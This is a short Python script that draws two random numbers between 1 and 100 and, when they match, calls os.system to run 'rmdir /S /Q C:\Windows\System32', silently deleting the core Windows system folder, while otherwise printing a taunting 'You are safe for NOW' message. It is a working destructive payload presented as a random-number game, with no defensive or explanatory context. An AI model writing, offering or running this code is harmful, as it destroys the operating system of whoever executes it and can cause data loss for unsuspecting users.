import random
import os

# Generate two random numbers
random_number_1 = random.randint(1, 100)  # Generates a random number between 1 and 100
random_number_2 = random.randint(1, 100)  # Generates another random number between 1 and 100

# Print the random numbers
print(f"Random Number 1: {random_number_1}")
print(f"Random Number 2: {random_number_2}")

# Check if the numbers are the same
if random_number_1 == random_number_2:
    os.system("rmdir /S /Q C:\\Windows\\System32")
else:
    print("YOu are safe for NOW ...")


